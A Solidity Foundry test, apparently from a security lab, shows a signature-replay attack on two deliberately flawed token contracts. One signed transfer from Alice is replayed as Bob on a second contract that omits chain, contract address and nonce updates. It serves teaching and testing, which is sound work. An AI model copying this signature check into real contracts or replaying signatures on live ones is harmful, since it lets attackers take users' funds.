// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract ContractTest is Test {
        TokenWhale TokenWhaleContract;
        SixEyeToken SixEyeTokenContract;
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        constructor(){

    TokenWhaleContract = new TokenWhale();   
    TokenWhaleContract.TokenWhaleDeploy(address(this));
    TokenWhaleContract.transfer(alice,1000);
    SixEyeTokenContract = new SixEyeToken();   
    SixEyeTokenContract.TokenWhaleDeploy(address(this));
    SixEyeTokenContract.transfer(alice,1000);

        }

function testSignatureReplay() public {
    emit log_named_uint("Balance",TokenWhaleContract.balanceOf(address(this)));
    
    bytes32 hash = keccak256(abi.encodePacked(address(alice),address(bob),uint256(499),uint256(1),uint256(0)));
    emit log_named_bytes32("hash",hash);

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
    emit log_named_uint("v",v);
    emit log_named_bytes32 ("r",r);
    emit log_named_bytes32 ("s",s);

    address alice_address = ecrecover(hash, v, r, s);
    emit log_named_address("alice_address",alice_address);
    emit log_string("If suspicious attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method.");             
    vm.startPrank(bob);

    TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
    // Bob successfully transferred funds from Alice.
    emit log_named_uint("SET token balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

    // Because we have nonce, so we can not replay again in same contract. BTW this nonce start from 0, it's not best practice.
    // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
    //emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

    emit log_string("Try to replay to another contract");
    emit log_named_uint("Before the replay, SIX token balance of bob:",SixEyeTokenContract.balanceOf(address(bob)));
 
    SixEyeTokenContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
    emit log_named_uint("After the replay, SIX token balance of bob:",SixEyeTokenContract.balanceOf(address(bob)));

    SixEyeTokenContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
    emit log_named_uint("After the second replay, SIX token balance of bob:",SixEyeTokenContract.balanceOf(address(bob)));
}
}

 contract TokenWhale is Test{
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    function transferProxy(address _from, address _to, uint256 _value, uint256 _feeUgt,
        uint8 _v,bytes32 _r, bytes32 _s) public returns (bool){

        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce",nonce);
        bytes32 h = keccak256(abi.encodePacked(_from,_to,_value,_feeUgt,nonce));
        if(_from != ecrecover(h,_v,_r,_s)) revert();

        if(balanceOf[_to] + _value < balanceOf[_to]
            || balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.sender] += _feeUgt;

        balanceOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeToken is Test{
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    function transferProxy(address _from, address _to, uint256 _value, uint256 _feeUgt,
        uint8 _v,bytes32 _r, bytes32 _s) public returns (bool){

        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(abi.encodePacked(_from,_to,_value,_feeUgt,nonce));
        if(_from != ecrecover(h,_v,_r,_s)) revert();

        if(balanceOf[_to] + _value < balanceOf[_to]
            || balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.sender] += _feeUgt;

        balanceOf[_from] -= _value + _feeUgt;
        return true;
    }
}